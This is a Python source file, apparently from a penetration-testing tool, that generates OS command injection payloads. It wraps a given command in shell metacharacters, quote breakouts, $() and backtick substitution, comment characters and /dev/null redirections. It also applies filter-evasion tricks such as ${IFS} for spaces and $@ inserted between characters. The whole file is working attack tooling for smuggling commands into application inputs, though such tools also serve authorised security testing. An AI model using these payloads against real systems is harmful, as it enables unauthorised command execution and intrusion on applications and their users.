from typing import Generator


COMMENT_CHARS = ("#",)

META_CHARS = (
    "&&",
    "||",
    "&",
    "|",
    ";",
)

QUOTE_CHARS = (
    "'",
    '"',
)

SUBSTITUTION_PATTERNS = (
    "$(%(cmd)s)",
    "`%(cmd)s`",
)

ENDINGS = (
    ">/dev/null",
    "2>/dev/null",
)


def replace_spaces_with_ifs(cmd: str) -> str:
    if " " not in cmd:
        return cmd

    return cmd.replace(" ", "${IFS}")


def add_dollar_and_ats(cmd: str) -> str:

    final = ""

    for char in cmd:

        final += char

        if char != " ":
            final += "$@"

    return final[:-2]


def build_payloads(
    cmd: str,
    tampers_patterns=[
        (add_dollar_and_ats, replace_spaces_with_ifs),
    ],
) -> Generator[str, None, None]:

    for tampers in tampers_patterns:
        for sp in SUBSTITUTION_PATTERNS:

            tampered = sp % {"cmd": cmd}

            yield tampered

            for tamper in tampers:
                tampered = tamper(tampered)

            yield tampered

        for quote in QUOTE_CHARS:
            for meta_chr in META_CHARS:
                tampered = quote + meta_chr + cmd

                yield tampered

                for tamper in tampers:
                    tampered = tamper(tampered)

                yield tampered

                for comment_chr in COMMENT_CHARS:
                    tampered = quote + meta_chr + cmd + comment_chr

                    yield tampered

                    for tamper in tampers:
                        tampered = tamper(tampered)

                    yield tampered

                for end in ENDINGS:
                    tampered = quote + end + meta_chr + cmd

                    yield tampered

                    for tamper in tampers:
                        tampered = tamper(tampered)

                    yield tampered

                    for comment_chr in COMMENT_CHARS:
                        tampered = quote + end + meta_chr + cmd + comment_chr

                        yield tampered

                        for tamper in tampers:
                            tampered = tamper(tampered)

                        yield tampered

        for meta_chr in META_CHARS:
            tampered = meta_chr + cmd

            yield tampered

            for tamper in tampers:
                tampered = tamper(tampered)

            yield tampered

            for comment_chr in COMMENT_CHARS:
                tampered = meta_chr + cmd + comment_chr

                yield tampered

                for tamper in tampers:
                    tampered = tamper(tampered)

                yield tampered

            for end in ENDINGS:
                tampered = end + meta_chr + cmd

                yield tampered

                for tamper in tampers:
                    tampered = tamper(tampered)

                yield tampered

                for comment_chr in COMMENT_CHARS:
                    tampered = end + meta_chr + cmd + comment_chr

                    yield tampered

                    for tamper in tampers:
                        tampered = tamper(tampered)

                    yield tampered

        for tamper in tampers:
            cmd = tamper(cmd)
        for sp in SUBSTITUTION_PATTERNS:

            tampered = sp % {"cmd": cmd}

            yield tampered

            for tamper in tampers:
                tampered = tamper(tampered)

            yield tampered

        for quote in QUOTE_CHARS:
            for meta_chr in META_CHARS:
                tampered = quote + meta_chr + cmd

                yield tampered

                for tamper in tampers:
                    tampered = tamper(tampered)

                yield tampered

                for comment_chr in COMMENT_CHARS:
                    tampered = quote + meta_chr + cmd + comment_chr

                    yield tampered

                    for tamper in tampers:
                        tampered = tamper(tampered)

                    yield tampered

                for end in ENDINGS:
                    tampered = quote + end + meta_chr + cmd

                    yield tampered

                    for tamper in tampers:
                        tampered = tamper(tampered)

                    yield tampered

                    for comment_chr in COMMENT_CHARS:
                        tampered = quote + end + meta_chr + cmd + comment_chr

                        yield tampered

                        for tamper in tampers:
                            tampered = tamper(tampered)

                        yield tampered

        for meta_chr in META_CHARS:
            tampered = meta_chr + cmd

            yield tampered

            for tamper in tampers:
                tampered = tamper(tampered)

            yield tampered

            for comment_chr in COMMENT_CHARS:
                tampered = meta_chr + cmd + comment_chr

                yield tampered

                for tamper in tampers:
                    tampered = tamper(tampered)

                yield tampered

            for end in ENDINGS:
                tampered = end + meta_chr + cmd

                yield tampered

                for tamper in tampers:
                    tampered = tamper(tampered)

                yield tampered

                for comment_chr in COMMENT_CHARS:
                    tampered = end + meta_chr + cmd + comment_chr

                    yield tampered

                    for tamper in tampers:
                        tampered = tamper(tampered)

                    yield tampered
